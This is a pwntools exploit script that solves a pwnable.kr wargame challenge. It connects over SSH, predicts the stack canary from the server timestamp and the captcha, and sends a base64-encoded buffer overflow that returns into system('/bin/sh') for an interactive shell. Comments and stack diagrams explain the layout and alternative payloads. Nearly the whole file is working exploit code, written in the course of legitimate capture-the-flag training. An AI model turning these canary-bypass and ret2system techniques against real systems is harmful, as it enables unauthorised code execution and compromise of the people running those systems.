from pwn import *
from ctypes import CDLL

'''
Before stack overflow, we need to compute the canary value
The canary value will be defined at first AND it wil be checked at the end of the function (Through calc and throw into __stack_ch_fail())

e.g.
v10 = __readgsdword(0x14u);

v4 = __readgsdword(0x14u);
return __readgsdword(0x14u) ^ v4;

e.g.
.text:08048F7B                 mov     edx, [ebp+var_C]
.text:08048F7E                 xor     edx, large gs:14h
.text:08048F85                 jz      short loc_8048F8C
.text:08048F87                 call    ___stack_chk_fail

In my_hash(), time(0) could be predicted due to it print out the current time stamp.
So we can reverse the canary value.
'''

context.log_level = "debug"
conn = ssh('fix', 'pwnable.kr', port=2222, password='guest')
get_time = conn.process('date +%s', shell=True)

p = conn.connect_remote('127.0.0.1', 9002)
timestamp = get_time.recvline().strip('\n')
get_time.close()

p.recvuntil("captcha : ")
captcha = p.recvline()

# leak canary
canary = int(process(['./canary', timestamp, captcha]).recvall(timeout=1).strip())
if canary < 0:
	canary += 4294967296		# 0xffffffff

log.info("Canary value is %d (%s)" % (canary, hex(canary)))
# len(Base64Decode(g_buf)) = 3/4 * len(g_buf) = 3/4 * 1024 <= 768           # Base64(3byte) = 4byte, so len(base64()) = 4*n
# len(v3) = 512
# v3 could be overflowed by g_buf


# <process_hash> - Before overflow
#                 +-------------+
#                 |    ret      |
#                 +-------------+
#                 |   old_ebp   |
#       ebp -->   +-------------+
#                       ...
#   ebp-0xC -->   +-------------+
#                 |   canary    |
#                 +-------------+
#                       ...
# ebp-0x20C -->   +-------------+
#                 |     v3      |
#                 +-------------+

# <process_hash> - After overflow
# shell_addr-->   +-------------+
#                 | /bin/sh\x00 |
#                 +-------------+
#                 |  shell_addr |
#                 +-------------+
#                 |    junk     |
#                 +-------------+
#                 |   system    |
#       ebp -->   +-------------+  <---
#                 |   old_ebp   |    |
#                 +-------------+  padding * 0xC
#                       ...          |
#   ebp-0xC -->   +-------------+  <---
#                 |   canary    |
#                 +-------------+  <---
#                       ...          |
# ebp-0x20C -->   +-------------+  padding * 512
#                 |   padding   |    |
#                 +-------------+  <---

call_system = 0x08049187
system_plt = 0x08048880
g_buf_bss = 0x0804B0E0
process_hash = 0x08048F92

payload = 'A' * 512
payload += p32(canary)
payload += 'B' * 12

#--------------------------											    # Approach 2, comment the below payload and uncommented the last seconde line
# payload += p32(process_hash) + p32(call_system) + p32(g_buf_bss)		
# payload = b64e(payload)
#
# overflow structure
#                 +-------------+
#                 |  g_buff_bss |  <--- "fgets("/bin/sh")"
#                 +-------------+
#                 | call_system |
#                 +-------------+
#                 |process_hash |
#                 +-------------+  <---
#                 |   old_ebp   |    |
#       ebp -->   +-------------+  padding * 0xC
#                       ...          |
#   ebp-0xC -->   +-------------+  <---
#                 |   canary    |
#                 +-------------+  <---
#                       ...          |
# ebp-0x20C -->   +-------------+  padding * 512
#                 |   padding   |    |
#                 +-------------+  <---
#--------------------------

payload += p32(call_system)
# payload += p32(system_plt) +'a' * 0x4                                 # Approach 3: When using addr of .plt, it needs an extra ret addr of it (junk)

shell_addr = g_buf_bss + len(b64e(payload + 'a' * 4))                   # b64e(v3) = g_buf, a*4 is the space for shell_addr

payload += p32(shell_addr)
payload = b64e(payload)
payload += '/bin/sh\x00'

p.send(captcha)                     # Authentication Success!
p.sendline(payload)
p.recvuntil('MD5', timeout=2)   	# Filter all useless output to make screen clean
p.recvline(timeout=2)
#--------------------------			# Approach 2
# p.sendline("/bin/sh\x00")
#--------------------------
p.interactive()

# bc7@planet:~/Desktop$ sudo apt-get install --reinstall libssl1.0.0:i386
# bc7@planet:~/Desktop$ one_gadget /usr/lib/i386-linux-gnu/libcrypto.so.1.0.0
# [OneGadget] ArgumentError: File "/usr/lib/i386-linux-gnu/libcrypto.so.1.0.0" doesn't contain string "/bin/sh", not glibc?
